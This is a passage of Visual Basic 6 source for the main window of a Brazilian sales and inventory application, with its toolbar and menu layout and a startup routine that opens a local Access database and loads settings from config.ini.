VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.1#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Object = "{00025600-0000-0000-C000-000000000046}#5.1#0"; "crystl32.ocx"
Begin VB.MDIForm MDIPrincipal 
   BackColor       =   &H00FFFFFF&
   Caption         =   "Vendas"
   ClientHeight    =   8130
   ClientLeft      =   225
   ClientTop       =   855
   ClientWidth     =   15120
   Icon            =   "MDIPrincipal.frx":0000
   LinkTopic       =   "MDIForm1"
   StartUpPosition =   3  'Windows Default
   WindowState     =   2  'Maximized
   Begin VB.Timer TM 
      Enabled         =   0   'False
      Interval        =   30000
      Left            =   9405
      Top             =   90
   End
   Begin Crystal.CrystalReport RptRel 
      Left            =   4005
      Top             =   5130
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   348160
      PrintFileLinesPerPage=   60
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   8100
      Top             =   4545
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   15
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   11
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":0442
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":0986
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":0DDA
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":0EF2
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":1346
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":179A
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":1BEE
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":2042
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":2156
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":25AA
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "MDIPrincipal.frx":26BE
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.Toolbar TlbPrincipal 
      Align           =   1  'Align Top
      Height          =   405
      Left            =   0
      TabIndex        =   1
      Top             =   600
      Width           =   15120
      _ExtentX        =   26670
      _ExtentY        =   714
      ButtonWidth     =   1931
      ButtonHeight    =   556
      Appearance      =   1
      TextAlignment   =   1
      ImageList       =   "ImageList1"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   15
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Novo"
            Object.ToolTipText     =   "Inclui um novo registro"
            ImageIndex      =   1
         EndProperty
         BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Alterar"
            Object.ToolTipText     =   "Altera o registro atual"
            ImageIndex      =   2
         EndProperty
         BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Excluir"
            Object.ToolTipText     =   "Excluir o registro"
            ImageIndex      =   3
         EndProperty
         BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button6 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Primeiro"
            Object.ToolTipText     =   "Vai para o primeiro registro"
            ImageIndex      =   4
         EndProperty
         BeginProperty Button7 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Anterior"
            Object.ToolTipText     =   "Volta um registro"
            ImageIndex      =   5
         EndProperty
         BeginProperty Button8 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Próximo"
            Object.ToolTipText     =   "Avança um registro "
            ImageIndex      =   6
         EndProperty
         BeginProperty Button9 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Ultimo"
            Object.ToolTipText     =   "Vai para o ultimo registro"
            ImageIndex      =   7
         EndProperty
         BeginProperty Button10 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button11 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button12 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Localizar"
            Object.ToolTipText     =   "Localização avançada"
            ImageIndex      =   8
         EndProperty
         BeginProperty Button13 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Filtrar"
            Object.ToolTipText     =   "Filtrar avançado"
            ImageIndex      =   9
         EndProperty
         BeginProperty Button14 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.Visible         =   0   'False
            Caption         =   "Salvar"
            Object.ToolTipText     =   "Salvar o reigistro atual"
            ImageIndex      =   10
         EndProperty
         BeginProperty Button15 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Object.Visible         =   0   'False
            Caption         =   "Cancela"
            Object.ToolTipText     =   "Cancelar as alterações"
            ImageIndex      =   11
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.StatusBar BarraStatus 
      Align           =   2  'Align Bottom
      Height          =   240
      Left            =   0
      TabIndex        =   0
      Top             =   7890
      Width           =   15120
      _ExtentX        =   26670
      _ExtentY        =   423
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
         EndProperty
      EndProperty
   End
   Begin MSComDlg.CommonDialog ComRel 
      Left            =   4005
      Top             =   4095
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.Toolbar Toolbar1 
      Align           =   1  'Align Top
      Height          =   600
      Left            =   0
      TabIndex        =   2
      Top             =   0
      Width           =   15120
      _ExtentX        =   26670
      _ExtentY        =   1058
      ButtonWidth     =   2064
      ButtonHeight    =   1005
      Appearance      =   1
      Style           =   1
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   18
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Entidades"
         EndProperty
         BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Produtos"
         EndProperty
         BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button6 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button7 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Pedidos"
            Style           =   5
            BeginProperty ButtonMenus {66833FEC-8583-11D1-B16A-00C0F0283628} 
               NumButtonMenus  =   2
               BeginProperty ButtonMenu1 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                  Text            =   "Emissão Pedido"
               EndProperty
               BeginProperty ButtonMenu2 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                  Text            =   "Consulta Pedido"
               EndProperty
            EndProperty
         EndProperty
         BeginProperty Button8 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button9 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button10 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Notas"
         EndProperty
         BeginProperty Button11 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button12 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button13 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Baixar Contas"
         EndProperty
         BeginProperty Button14 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button15 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button16 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Caption         =   "Sair"
            BeginProperty ButtonMenus {66833FEC-8583-11D1-B16A-00C0F0283628} 
               NumButtonMenus  =   2
               BeginProperty ButtonMenu1 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                  Key             =   "acc_type"
                  Text            =   "Tipos de Contas"
               EndProperty
               BeginProperty ButtonMenu2 {66833FEE-8583-11D1-B16A-00C0F0283628} 
                  Key             =   "users"
                  Text            =   "Config. Usuário"
               EndProperty
            EndProperty
         EndProperty
         BeginProperty Button17 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button18 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
      EndProperty
      Begin VB.TextBox Text1 
         Height          =   285
         Left            =   10440
         MultiLine       =   -1  'True
         TabIndex        =   3
         Top             =   135
         Visible         =   0   'False
         Width           =   1485
      End
      Begin VB.PictureBox Picture2 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   600
         Left            =   13185
         Picture         =   "MDIPrincipal.frx":2B12
         ScaleHeight     =   600
         ScaleWidth      =   2040
         TabIndex        =   6
         ToolTipText     =   "Duplo click para chamar o suporte"
         Top             =   -45
         Width           =   2040
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BorderStyle     =   0  'None
         Enabled         =   0   'False
         ForeColor       =   &H80000008&
         Height          =   465
         Left            =   8370
         ScaleHeight     =   465
         ScaleWidth      =   5100
         TabIndex        =   4
         Top             =   45
         Width           =   5100
         Begin VB.TextBox Texto 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000F&
            BorderStyle     =   0  'None
            Enabled         =   0   'False
            BeginProperty Font 
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   510
            Left            =   -585
            MultiLine       =   -1  'True
            TabIndex        =   5
            Top             =   -45
            Width           =   5685
         End
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "&Cadastro"
      Index           =   0
      Begin VB.Menu MnuCad 
         Caption         =   "&Entidades"
         Index           =   0
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Familias"
         Index           =   1
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Grupos"
         Index           =   2
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Produtos"
         Index           =   3
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Convênio"
         Index           =   4
      End
      Begin VB.Menu MnuCad 
         Caption         =   "-"
         Index           =   5
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Indices"
         Index           =   6
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&C.F.Op"
         Index           =   7
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Loja (estoque)"
         Index           =   8
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&I.C.M.S. por Estado"
         Index           =   9
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Plano de Contas"
         Index           =   10
      End
      Begin VB.Menu MnuCad 
         Caption         =   "Lista Gru&po"
         Index           =   11
      End
      Begin VB.Menu MnuCad 
         Caption         =   "Lista Fa&milia"
         Index           =   12
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Departamentos"
         Index           =   13
      End
      Begin VB.Menu MnuCad 
         Caption         =   "Fa&ses de Produção"
         Enabled         =   0   'False
         Index           =   14
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Acabamento"
         Index           =   15
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Vencimentos"
         Index           =   16
      End
      Begin VB.Menu MnuCad 
         Caption         =   "&Centro Custo"
         Index           =   17
      End
      Begin VB.Menu MnuCad 
         Caption         =   "I.V.A. Outros Estados"
         Index           =   18
      End
      Begin VB.Menu MnuCad 
         Caption         =   "Consulta ACIR/&Urupês"
         Index           =   19
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "&Produtos"
      Index           =   1
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Altera por Fornecedor"
         Index           =   0
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "Altera por &Grupo"
         Index           =   1
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "Altera por Família"
         Index           =   2
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Cotação por Fornecedor"
         Index           =   3
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Faltas / Trocas"
         Enabled         =   0   'False
         Index           =   4
         Visible         =   0   'False
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Margem de Lucro"
         Index           =   5
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Movimentação de Estoque"
         Index           =   6
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Consulta Composição"
         Index           =   7
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Planilha de Entrega"
         Index           =   8
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "Con&trole de Assitências"
         Index           =   9
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Ordem de Fabricação"
         Enabled         =   0   'False
         Index           =   10
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Exporta Balança Filzola (TSC)"
         Index           =   11
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "Exporta &BalançaToledo (Prix4)"
         Index           =   12
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "&Atualiza Custo Médio"
         Index           =   13
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "Monta Lista &Vendas"
         Index           =   14
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "Atualiza Preço Venda"
         Enabled         =   0   'False
         Index           =   15
      End
      Begin VB.Menu MnuPrecos 
         Caption         =   "Cadastra Comissões"
         Index           =   16
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "Pe&didos"
      Index           =   2
      Begin VB.Menu MnuPed 
         Caption         =   "&Emissão Pedidos"
         Index           =   0
      End
      Begin VB.Menu MnuPed 
         Caption         =   "&Consulta Pedidos"
         Index           =   1
      End
      Begin VB.Menu MnuPed 
         Caption         =   "&Emissão de Nota Fiscal"
         Index           =   2
      End
      Begin VB.Menu MnuPed 
         Caption         =   "&Importação de Pedido"
         Index           =   3
         Shortcut        =   ^{F3}
      End
      Begin VB.Menu MnuPed 
         Caption         =   "&Entregas Pendentes"
         Index           =   4
      End
      Begin VB.Menu MnuPed 
         Caption         =   "Controle Entregas &Futuras"
         Index           =   5
      End
      Begin VB.Menu MnuPed 
         Caption         =   "-"
         Index           =   6
      End
      Begin VB.Menu MnuPed 
         Caption         =   "Relatório p/ &Produção"
         Index           =   7
      End
      Begin VB.Menu MnuPed 
         Caption         =   "&Romaneio de Entrega"
         Index           =   8
      End
      Begin VB.Menu MnuPed 
         Caption         =   "Controle de Entrega"
         Index           =   9
      End
      Begin VB.Menu MnuPed 
         Caption         =   "-"
         Index           =   10
      End
      Begin VB.Menu MnuPed 
         Caption         =   "Mdf-e"
         Index           =   11
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "Contas(&Receber)"
      Index           =   3
      Begin VB.Menu MnuPcl 
         Caption         =   "&Baixar Contas a Receber"
         Index           =   0
      End
      Begin VB.Menu MnuPcl 
         Caption         =   "&Emitir Contas a Receber"
         Index           =   1
      End
      Begin VB.Menu MnuPcl 
         Caption         =   "-"
         Index           =   2
      End
      Begin VB.Menu MnuPcl 
         Caption         =   "&Relatório Contas Receber/Recebidas"
         Index           =   3
      End
      Begin VB.Menu MnuPcl 
         Caption         =   "Relatório &de Recebimento"
         Index           =   4
      End
      Begin VB.Menu MnuPcl 
         Caption         =   "-"
         Index           =   5
      End
      Begin VB.Menu MnuPcl 
         Caption         =   "Boleto"
         Index           =   6
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "Contas(&Pagar)"
      Index           =   4
      Begin VB.Menu MnuPag 
         Caption         =   "&Lançar Contas a Pagar"
         Index           =   0
      End
      Begin VB.Menu MnuPag 
         Caption         =   "&Baixar Contas a Pagar"
         Index           =   1
      End
      Begin VB.Menu MnuPag 
         Caption         =   "-"
         Index           =   2
      End
      Begin VB.Menu MnuPag 
         Caption         =   "&Relatórios Contas/Pagamento"
         Index           =   3
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "&Caixa"
      Index           =   5
      Begin VB.Menu MnuCxa 
         Caption         =   "&Movimentação"
         Index           =   0
      End
      Begin VB.Menu MnuCxa 
         Caption         =   "&Fechamento por Turno"
         Index           =   1
      End
      Begin VB.Menu MnuCxa 
         Caption         =   "&Fechamento por Período"
         Index           =   2
      End
      Begin VB.Menu MnuCxa 
         Caption         =   "Cont&role do Caixa"
         Index           =   3
      End
      Begin VB.Menu MnuCxa 
         Caption         =   "-"
         Index           =   4
      End
      Begin VB.Menu MnuCxa 
         Caption         =   "&Relatório Caixa"
         Enabled         =   0   'False
         Index           =   5
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "&Relatórios"
      Index           =   6
      Begin VB.Menu MnuRel 
         Caption         =   "&Entidades"
         Index           =   0
         Begin VB.Menu MnuEnt 
            Caption         =   "&Simples"
            Index           =   0
         End
         Begin VB.Menu MnuEnt 
            Caption         =   "&Vendedores"
            Index           =   1
         End
      End
      Begin VB.Menu MnuRel 
         Caption         =   "&Produtos"
         Index           =   1
         Begin VB.Menu MnuPrd 
            Caption         =   "&Lista de Produtos"
            Index           =   0
         End
         Begin VB.Menu MnuPrd 
            Caption         =   "&Estoque"
            Index           =   1
         End
         Begin VB.Menu MnuPrd 
            Caption         =   "&Movimentação Produtos"
            Index           =   2
         End
         Begin VB.Menu MnuPrd 
            Caption         =   "Sugestão de Compra"
            Index           =   3
         End
         Begin VB.Menu MnuPrd 
            Caption         =   "&Composição de produtos"
            Index           =   4
         End
         Begin VB.Menu MnuPrd 
            Caption         =   "&Conferência de Estoque"
            Index           =   5
         End
      End
      Begin VB.Menu MnuRel 
         Caption         =   "&Cartas e Contrato"
         Index           =   2
         Begin VB.Menu MnuCarta 
            Caption         =   "&Contrato"
            Index           =   0
         End
         Begin VB.Menu MnuCarta 
            Caption         =   "Carta de Cob&rança"
            Index           =   1
         End
         Begin VB.Menu MnuCarta 
            Caption         =   "Carta &Promoção"
            Index           =   2
         End
      End
      Begin VB.Menu MnuRel 
         Caption         =   "&Gerenciais"
         Index           =   3
         Begin VB.Menu MnuCrm 
            Caption         =   "&Pedidos"
            Index           =   0
         End
         Begin VB.Menu MnuCrm 
            Caption         =   "&Notas"
            Index           =   1
            Shortcut        =   ^{F4}
         End
         Begin VB.Menu MnuCrm 
            Caption         =   "&Estatisticas"
            Index           =   2
            Begin VB.Menu MenuEstat 
               Caption         =   "&Produtos"
               Index           =   0
            End
            Begin VB.Menu MenuEstat 
               Caption         =   "&Entidades"
               Index           =   1
            End
            Begin VB.Menu MenuEstat 
               Caption         =   "&Vendedor"
               Index           =   2
            End
            Begin VB.Menu MenuEstat 
               Caption         =   "&Clientes"
               Index           =   3
            End
         End
         Begin VB.Menu MnuCrm 
            Caption         =   "&Balancete"
            Index           =   3
         End
         Begin VB.Menu MnuCrm 
            Caption         =   "&Comissões"
            Index           =   4
         End
         Begin VB.Menu MnuCrm 
            Caption         =   "&Limite de Crédito"
            Index           =   5
         End
      End
      Begin VB.Menu MnuRel 
         Caption         =   "E&tiquetas"
         Index           =   4
         Begin VB.Menu MnuEtq 
            Caption         =   "&Produtos"
            Index           =   0
         End
         Begin VB.Menu MnuEtq 
            Caption         =   "&Entidades"
            Index           =   1
         End
      End
      Begin VB.Menu MnuRel 
         Caption         =   "Convênios"
         Index           =   5
      End
      Begin VB.Menu MnuRel 
         Caption         =   "Parceiros"
         Index           =   6
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "&Utilitários"
      Index           =   7
      Begin VB.Menu MnuUtil 
         Caption         =   "&Calculadora"
         Index           =   0
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "&Reparar Bco Dados"
         Index           =   1
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "Cópia de Segurança"
         Index           =   2
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "Configuração"
         Index           =   3
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "&Exportação de Dados"
         Index           =   4
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "&Importação/Atualização Preços"
         Index           =   5
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "Arquivos Textos"
         Index           =   6
         Begin VB.Menu MnuArqTexto 
            Caption         =   "&Gera Arquivo Texto Equifax"
            Index           =   0
         End
         Begin VB.Menu MnuArqTexto 
            Caption         =   "&Módulo de Geração de Arquivos"
            Index           =   1
         End
         Begin VB.Menu MnuArqTexto 
            Caption         =   "&Dados Pegasus Bayer"
            Index           =   2
         End
         Begin VB.Menu MnuArqTexto 
            Caption         =   "&R.E.D.F. / Nota Paulista"
            Index           =   3
         End
         Begin VB.Menu MnuArqTexto 
            Caption         =   "&Exporta Acronym"
            Index           =   4
         End
         Begin VB.Menu MnuArqTexto 
            Caption         =   "Dados Boticario"
            Index           =   5
         End
         Begin VB.Menu MnuArqTexto 
            Caption         =   "Importação Rfd"
            Index           =   6
         End
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "&Correção de arquivos"
         Index           =   7
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "&Senhas"
         Index           =   8
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "Suporte Remoto"
         Index           =   9
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "&Integração Site"
         Index           =   10
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "&Atualiza Gerador Relatorios"
         Index           =   11
      End
      Begin VB.Menu MnuUtil 
         Caption         =   "Arquivos Fiscais"
         Index           =   12
      End
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "&Ajuda"
      Index           =   8
   End
   Begin VB.Menu MnuPrincipal 
      Caption         =   "&Fim"
      Index           =   9
   End
End
Attribute VB_Name = "MDIPrincipal"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command_Click()
FrmEntidades.Show
'AtivaFundo False
End Sub

Private Sub Command1_Click()
'MsgBox Texto, vbInformation, "Minutos de Sabedoria / Gotas de Luz"

End Sub

'
Private Sub MDIForm_Load()
Dim P As Long
Set Formulário = Me

' On Error GoTo Abertura

Set Banco = DBEngine.Workspaces(0).OpenDatabase(Caminho & "\Dados.mdb")
NomeDoBanco = "Dados.mdb"

'StringConexao = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Caminho & "\Dados.mdb" & ";Persist Security Info=False"

'LocalCursor = adUseClient
'If BancoSRCaixa.State = 1 Then Banco.Close
'Banco.ConnectionString = StringConexao
'Banco.CommandTimeout = 0

'Banco.Open

P = NameOfPC(Maquina)

Maquina = LimpaString(Maquina)

If LerINI("Config", "Terminal", App.Path & "\config.ini") <> "" Then
    If LerINI("Config", "Terminal", App.Path & "\config.ini") = 1 Then
        P = Get_User_name(Maquina)

        Maquina = LimpaString(Maquina)

    End If
End If
Set Configuracao = Banco.OpenRecordset("CFG")

If Dir("C:\LOCAL.CFG") <> "" Then
    Porta = "LPT1"
Else
    Porta = Configuracao("Porta")
End If

If GetSetting(App.EXEName, "SystemReport", "Sys03") <> "" Then
    Porta = GetSetting(App.EXEName, "SystemReport", "Sys03")
End If

VarPrecoPedido = 1

NomeEmpresa = Configuracao("NomeEmpresa")
Cabecalho1 = Configuracao("Cabecalho1")
Cabecalho2 = Configuracao("Cabecalho2")
VarEndEmpresa = LerINI("Config", "Endereco", LocalBanco & "\config.ini")
Cnpj = LerINI("Config", "Cnpj", LocalBanco & "\config.ini")
VarInscr = LerINI("Config", "Inscr", LocalBanco & "\config.ini")

NomeInscr = LerINI("Config", "Empresa", App.Path & "\config.ini")
CidadeEmpresa = LerINI("Config", "CidadeEmpresa", App.Path & "\config.ini")
If LerINI("Pedido", "PcoCompra", App.Path & "\config.ini") <> "" Then
    ContCompra = LerINI("Pedido", "PcoCompra", App.Path & "\config.ini")
Else
    ContCompra = False
End If

If LerINI("Pedido", "PzoProduto", App.Path & "\config.ini") <> "" Then
    VarPzoProduto = LerINI("Pedido", "PzoProduto", App.Path & "\config.ini")
Else
    VarPzoProduto = False
End If

If LerINI("Pedido", "PcoPrazo", App.Path & "\config.ini") <> "" Then
    VarPcoPrazo = LerINI("Pedido", "PcoPrazo", App.Path & "\config.ini")
Else
    VarPcoPrazo = False
End If

If LerINI("Pedido", "ValorPedidoVista", App.Path & "\config.ini") <> "" Then
    VarValorPedidoVista = LerINI("Pedido", "ValorPedidoVista", App.Path & "\config.ini")
Else
    VarValorPedidoVista = False
End If

If LerINI("Financeiro", "Comunica", App.Path & "\config.ini") <> "" Then
    InterFinanc = LerINI("Financeiro", "Comunica", App.Path & "\config.ini")
Else
    InterFinanc = 0
End If

LocalBcoFin = LerINI("Financeiro", "LocalBcoFin", App.Path & "\config.ini")
If LocalBcoFin = "" Then
    LocalBcoFin = App.Path
End If

CasasDec = LerINI("Pedido", "CasasDec", App.Path & "\config.ini")
If CasasDec = "" Then
    CasasDec = 2
End If

If LerINI("Pedido", "MostrarCusto", App.Path & "\config.ini") <> "" Then
    VarCustoPed = LerINI("Pedido", "MostrarCusto", App.Path & "\config.ini")
Else
    VarCustoPed = 0
End If

If LerINI("Pedido", "FunRural", App.Path & "\config.ini") <> "" Then
    VarFunRural = LerINI("Pedido", "FunRural", App.Path & "\config.ini")
Else
    VarFunRural = 0
End If

LocalEstoque = LerINI("Produto", "LocalEstoque", App.Path & "\config.ini")

Cnpj = LerINI("Config", "Cnpj", App.Path & "\config.ini")

If LerINI("Pedido", "MostraTipoPgtoCaixa", App.Path & "\config.ini") <> "" Then
    VarMostraPgtoCaixa = LerINI("Pedido", "MostraTipoPgtoCaixa", App.Path & "\config.ini")
Else
    VarMostraPgtoCaixa = 0
End If

If LerINI("Pedido", "ObsAutomatica", App.Path & "\config.ini") <> "" Then
    VarObsAutomatica = LerINI("Pedido", "ObsAutomatica", App.Path & "\config.ini")
Else
    VarObsAutomatica = 0
End If

If LerINI("Pedido", "PrecoCima", App.Path & "\config.ini") <> "" Then
    VarPrecoCima = LerINI("Pedido", "PrecoCima", App.Path & "\config.ini")
Else
    VarPrecoCima = 0
End If

If LerINI("Nota", "CompObs", App.Path & "\config.ini") <> "" Then
    VarCompObs = LerINI("Nota", "CompObs", App.Path & "\config.ini")
Else
    VarCompObs = 45
End If

If LerINI("LOCALBCO", "SenhaBco", App.Path & "\config.ini") <> "" Then
    VarSenhaBco = LerINI("LOCALBCO", "SenhaBco", App.Path & "\config.ini")
End If

VarImprBarra = LerINI("Impressora", "ImprCodBarra", App.Path & "\config.ini")


If LerINI("Nota", "TranspNota", App.Path & "\config.ini") <> "" Then
    VarTranspNt = LerINI("Nota", "TranspNota", App.Path & "\config.ini")
Else
    VarTranspNt = 0
End If

If LerINI("Produto", "NroCodigo", App.Path & "\config.ini") <> "" Then
    VarTamCod = LerINI("Produto", "NroCodigo", App.Path & "\config.ini")
Else
    VarTamCod = 8
End If

If LerINI("Produto", "TamBarra", App.Path & "\config.ini") <> "" Then
    VarTamBarra = LerINI("Produto", "TamBarra", App.Path & "\config.ini")
Else
    VarTamBarra = 8
End If

If LerINI("Pedido", "ReajustaConta", App.Path & "\config.ini") <> "" Then
    VarReajConta = LerINI("Pedido", "ReajustaConta", App.Path & "\config.ini")
Else
    VarReajConta = 0
End If

If LerINI("Produto", "HistEstoque", App.Path & "\config.ini") <> "" Then
    VarHistEst = LerINI("Produto", "HistEstoque", App.Path & "\config.ini")
Else
    VarHistEst = 0
End If

If LerINI("Pedido", "Completo", App.Path & "\config.ini") <> "" Then
    VarPedCompleto = LerINI("Pedido", "Completo", App.Path & "\config.ini")
Else
    VarPedCompleto = 0
End If

If LerINI("Pedido", "Financeiro", App.Path & "\config.ini") <> "" Then
    VarFinanceiro = LerINI("Pedido", "Financeiro", App.Path & "\config.ini")
Else
    VarFinanceiro = 1
End If

